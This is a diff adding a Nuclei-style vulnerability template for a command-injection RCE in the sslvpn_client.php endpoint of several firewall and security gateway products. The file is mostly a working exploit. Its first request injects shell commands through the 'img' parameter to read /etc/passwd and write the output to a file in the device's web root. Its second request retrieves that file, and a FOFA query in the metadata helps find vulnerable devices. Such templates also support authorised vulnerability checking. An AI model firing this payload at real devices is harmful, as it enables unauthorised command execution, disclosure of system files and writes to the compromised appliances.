@@ -1,0 +1,33 @@
+id: SecureAsset-sslvpn_client-rce
+
+info:
+  name: RCE vulnerabilities in security products such as firewalls, gateways, and audit systems(防火墙 网关 审计系统等多家安全产品RCE漏洞)
+  author: linfeng7z
+  severity: critical
+  description: H3C-下一代防火墙/安恒信息-明御安全网关/D_Link-下一代防火墙/迈普通信技术股份有限公司安全网关/博达通信-下一代防火墙/任天行安全审计系统等安全设备均存在RCE漏洞
+  tags: rce,firewall,gateways,audit
+  metadata:
+    fofa-qeury: body="/webui/images/default/default/alert_close.jpg"
+    veified: true
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(10))}}.txt"
+
+http:
+  - raw:
+      - |
+        GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60cat%20/etc/passwd%60%20|tee%20/usr/local/webui/sslvpn/{{file_name}}|ls HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+      - |
+        GET /sslvpn/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, 'root:') && contains(body_2, 'bin/')"
+          - "status_code_1 == 200 && status_code_2 == 200"
+        condition: and
